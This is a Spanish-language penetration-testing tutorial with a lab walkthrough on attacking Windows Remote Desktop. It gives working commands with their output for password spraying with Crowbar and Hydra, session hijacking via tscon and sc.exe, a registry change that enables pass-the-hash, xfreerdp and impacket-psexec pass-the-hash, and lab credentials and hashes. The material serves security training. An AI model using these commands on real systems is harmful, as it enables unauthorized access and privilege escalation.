
# Ataques a RDP

[Remote Desktop Protocol (RDP)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) es un protocolo desarrollado por Microsoft que proporciona al usuario una interfaz gráfica para conectarse a otra computadora a través de una conexión de red. También es una de las herramientas de administración más populares, que permite a los administradores de sistemas controlar de forma centralizada sus sistemas remotos con la misma funcionalidad que si estuvieran en el sitio. Además, los proveedores de servicios gestionados (MSP) suelen utilizar la herramienta para gestionar cientos de redes y sistemas de clientes.&#x20;

Desafortunadamente, si bien RDP facilita enormemente la administración remota de sistemas de TI distribuidos, también crea otra puerta de entrada para los ataques.

De forma predeterminada, RDP utiliza el puerto `TCP/3389`. Usando `Nmap`, podemos identificar el servicio RDP disponible en el host de destino:

```shell-session
afsh4ck@kali# nmap -Pn -p3389 192.168.2.143 

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
Nmap scan report for 192.168.2.143
Host is up (0.00037s latency).

PORT     STATE    SERVICE
3389/tcp open ms-wbt-server
```

***

## <mark style="color:purple;">Configuraciones erróneas</mark>

Dado que RDP toma las credenciales del usuario para la autenticación, un vector de ataque común contra el protocolo RDP es el bruteforce de contraseñas. Aunque no es habitual, podríamos encontrarnos con un servicio RDP sin contraseña si hay una mala configuración.

Una advertencia sobre la adivinación de contraseñas en instancias de Windows es que se debe considerar la política de contraseñas del cliente. En muchos casos, una cuenta de usuario se bloqueará o deshabilitará después de una cierta cantidad de intentos fallidos de inicio de sesión. En este caso, podemos realizar una técnica específica para adivinar la contraseña llamada `Password Spraying`. Esta técnica funciona intentando una única contraseña para muchos nombres de usuario antes de probar con otra contraseña, teniendo cuidado de evitar el bloqueo de la cuenta.

Usando la herramienta [Crowbar](https://github.com/galkan/crowbar) , podemos realizar un ataque de Password Spraying contra el servicio RDP. Como ejemplo a continuación, la contraseña `password123` se probará con una lista de nombres de usuario en el archivo `usernames.txt`. El ataque encontró credenciales válidas como `administrator`: `password123` en el host RDP de destino.

```shell-session
afsh4ck@kali# cat usernames.txt 

root
test
user
guest
admin
administrator
```

### **Crowbar - Password Spraying de RDP**

```shell-session
afsh4ck@kali# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'

2022-04-07 15:35:50 START
2022-04-07 15:35:50 Crowbar v0.4.1
2022-04-07 15:35:50 Trying 192.168.220.142:3389
2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
2022-04-07 15:35:52 STOP
```

También podemos utilizar `Hydra` para realizar un ataque de Password Spraying.

### **Hydra - Password Spraying de RDP**

```shell-session
afsh4ck@kali# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
[DATA] attacking rdp://192.168.2.147:3389/
[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
```

Podemos realizar RDP en el sistema de destino utilizando `rdesktop` o `xfreerdp` con credenciales válidas.

### **Iniciar sesión en RDP**

```shell-session
afsh4ck@kali# rdesktop -u admin -p password123 192.168.2.143

Autoselecting keyboard map 'en-us' from locale

ATTENTION! The server uses an invalid security certificate which can not be trusted for
the following identified reasons(s);

 1. Certificate issuer is not trusted by this system.
     Issuer: CN=WIN-Q8F2KTAI43A

Review the following certificate info before you trust it to be added as an exception.
If you do not trust the certificate, the connection atempt will be aborted:

    Subject: CN=WIN-Q8F2KTAI43A
     Issuer: CN=WIN-Q8F2KTAI43A
 Valid From: Tue Aug 24 04:20:17 2021
         To: Wed Feb 23 03:20:17 2022

  Certificate fingerprints:

       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57

Do you trust this certificate (yes/no)? yes
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-7-2.png)

***

## <mark style="color:purple;">Ataques específicos de protocolo</mark>

Imaginemos que logramos acceder a una máquina y tenemos una cuenta con privilegios de administrador local. Si un usuario está conectado a través de RDP a nuestra máquina comprometida, podemos secuestrar la sesión de escritorio remoto del usuario para escalar nuestros privilegios y suplantar la cuenta. En un entorno de Active Directory, esto podría dar lugar a que tomemos el control de una cuenta de administrador de dominio o aumentemos nuestro acceso dentro del dominio.

### **Secuestro de sesión RDP**

Como se muestra en el siguiente ejemplo, iniciamos sesión como el usuario `juurena` (ID de usuario = 2) que tiene privilegios de `Administrator`. Nuestro objetivo es secuestrar la sesión del usuario `lewen` (ID de usuario = 4), que también inició sesión a través de RDP.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-1-2.png)

Para hacerse pasar por un usuario sin su contraseña, necesitamos tener privilegios `SYSTEM` y usar el binario  [tscon.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) que permite a los usuarios conectarse a otra sesión de escritorio. Funciona especificando la  `SESSION ID`( `4`para la sesión de `lewen` en nuestro ejemplo). Nos gustaría conectarnos a la sesión ( `rdp-tcp#13`que es nuestra sesión actual). Entonces, por ejemplo, el siguiente comando abrirá una nueva consola dentro del `SESSION_ID` de nuestra sesión RDP actual:

```powershell
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{NUESTRO_SESSION_ID}
```

Si tenemos privilegios de administrador local, podemos utilizar varios métodos para obtener privilegios `SYSTEM`, como por ejemplo [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) o [Mimikatz](https://github.com/gentilkiwi/mimikatz) . Un truco simple es crear un servicio de Windows que, de forma predeterminada, se ejecutará en `Local System` y ejecutará cualquier binario con privilegios `SYSTEM`. Usaremos el binario [Microsoft sc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create) . Primero, especificamos el nombre del servicio ( `sessionhijack`) y el `binpath`, que es el comando que queremos ejecutar. Una vez que ejecutemos el  comando `query user` se creará un servicio llamado `sessionhijack`

```powershell
C:\htb> query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"

[SC] CreateService SUCCESS
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-2-2.png)

Para ejecutar el comando, podemos iniciar el servicio `sessionhijack`:

```powershell
C:\htb> net start sessionhijack
```

Una vez iniciado el servicio aparecerá un nuevo terminal con la sesión del usuario `lewen`. Con esta nueva cuenta, podemos intentar descubrir qué tipo de privilegios tiene en la red, y tal vez tengamos suerte y el usuario sea miembro del grupo de la mesa de ayuda con derechos de administrador para muchos hosts o incluso un administrador de dominio. .

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-3-2.png)

{% hint style="warning" %}
**Nota**: este método ya no funciona en Windows Server 2019.
{% endhint %}

***

## <mark style="color:purple;">RDP Pass the Hash (PtH)</mark>

Es posible que queramos acceder a aplicaciones o software instalados en el sistema Windows de un usuario que solo está disponible con acceso GUI durante una prueba de penetración. Si tenemos credenciales en texto plano para el usuario objetivo, no habrá ningún problema para ingresar RDP al sistema.&#x20;

Sin embargo, ¿qué pasa si solo tenemos el hash NT del usuario obtenido de un ataque de volcado de credenciales como la base de datos [SAM](https://en.wikipedia.org/wiki/Security_Account_Manager) , y no podemos descifrar el hash para revelar la contraseña en texto plano? En algunos casos, podemos realizar un ataque RDP PtH para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Hay algunas advertencias sobre este ataque:

* `Restricted Admin Mode`, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se nos solicitará el siguiente error:

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-4.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin`(REG\_DWORD) en `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`.&#x20;

Se puede hacer usando el siguiente comando:

### **Agregar la clave de registro DisableRestrictedAdmin**

```powershell
C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-5.png)

Una vez agregada la clave de registro, podemos usar `xfreerdp` con la opción `/pth` para obtener acceso RDP:

```shell-session
afsh4ck@kali# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9

[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"

<SNIP>

```

Si funciona, ahora iniciaremos sesión a través de RDP como el usuario objetivo sin conocer su contraseña en texto plano.

![](https://academy.hackthebox.com/storage/modules/116/rdp_session-6-2.png)

Tenga en cuenta que esto no funcionará en todos los sistemas Windows que encontremos, pero siempre vale la pena intentarlo en una situación en la que tengamos un hash NTLM, sepamos que el usuario tiene derechos RDP en una máquina o conjunto de máquinas, y el acceso a la GUI sería beneficioso. ayudarnos de alguna manera a cumplir el objetivo de nuestra evaluación.

## <mark style="color:purple;">Impacket-PsExec</mark>

Si la técnica anterior falla podemos hacer el Pass the Hash con PsExec para ganar una shell:

```shell-session
afsh4ck@kali$ impacket-psexec -hashes :300FF5E89EF33F83A8146C10F5AB9BB9 lewen@10.129.162.164 cmd
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.162.164.....
[*] Found writable share ADMIN$
[*] Uploading file MqPDHfSA.exe
[*] Opening SVCManager on 10.129.162.164.....
[*] Creating service LVBE on 10.129.162.164.....
[*] Starting service LVBE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
superstore\lewen
```

***

## <mark style="color:purple;">Caso práctico</mark>

> Accede por RDP y busca la manera de elevar tus privilegios. Después accede como administrador y lee la flag del escritorio.

### Acceso cómo usuario

```
xfreerdp /v:10.129.141.210 /u:htb-rdp /p:HTBRocks!
```

<figure><img src="/files/yl2havnVtpTOUrKXAnaP" alt=""><figcaption></figcaption></figure>

Accedemos correctamente y encontramos un archivo que contiene las credenciales de un usuario administrador:

```
User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
```

### Acceso cómo administrador

```
xfreerdp /v:10.129.141.210 /u:administrator /pth:0E14B9D6330BF16C30B1924111104824
```

<figure><img src="/files/glW10f5kUFlegSP9L7e0" alt=""><figcaption></figcaption></figure>

Tenemos el acceso restringido por Pass the Hash, por lo que vamos a conectarnos de nuevo y añadir el registro:

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

<figure><img src="/files/cxxDkjjl8o7HeK89dqxk" alt=""><figcaption></figcaption></figure>

Una vez habilitado el registro, vamos a hacer el Pass the Hash con el usuario `administrator`:

```
xfreerdp /v:10.129.141.210 /u:administrator /pth:0E14B9D6330BF16C30B1924111104824
```

<figure><img src="/files/TFckFZEsIKUixl28AG7O" alt=""><figcaption></figcaption></figure>

Y buuum! Conseguimos acceder correctamente y obtenemos la flag en el escritorio 🏆
